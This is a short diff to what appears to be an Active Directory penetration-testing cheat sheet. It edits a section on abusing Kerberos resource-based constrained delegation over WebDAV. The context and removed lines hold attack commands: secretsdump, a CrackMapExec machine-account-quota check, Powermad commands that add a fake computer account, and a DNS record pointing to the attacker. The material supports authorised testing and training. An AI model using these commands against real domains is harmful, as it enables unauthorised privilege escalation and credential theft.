@@ -772,7 +772,7 @@ python3 Secretsdump.py -k <TARGET FQDN>
   - An account with a SPN associated (or able to add new machines accounts (default value this quota is 10))
   - WebDAV Redirector feature must be installed on the victim machine. (W10 has it by default, but manually installed on server 2016 and later)
   - A DNS record pointing to the attacker’s machine (By default authenticated users can do this)
-  - Access to the GUI in order to use the “Create your picture –> Browse for one” functionality. 
+  - Access to the GUI in order to use the “Create your picture –> Browse for one” functionality. (or use ps1 script)
 - https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/
 
 #### Check who can add computers to the domain
@@ -789,14 +789,6 @@ cme ldap <DC IP> -d <DOMAIN> -u <USER> -p <PASS> -M maq
 ```
 import-module powermad
 New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
-```
-
-#### Create a DNS record pointing to the attacker's machine IP
-- Use the created new computer object
-- https://github.com/Kevin-Robertson/Powermad/blob/master/Invoke-DNSUpdate.ps1
-```
-$creds = get-credential
-Invoke-DNSUpdate -DNSType A -DNSName webdav.<DOMAIN> -DNSData <IP ATTACKING MACHINE> -Credential $creds -Realm <DOMAIN>
 ```
 
 #### Create a DNS record pointing to the attacker's machine IP
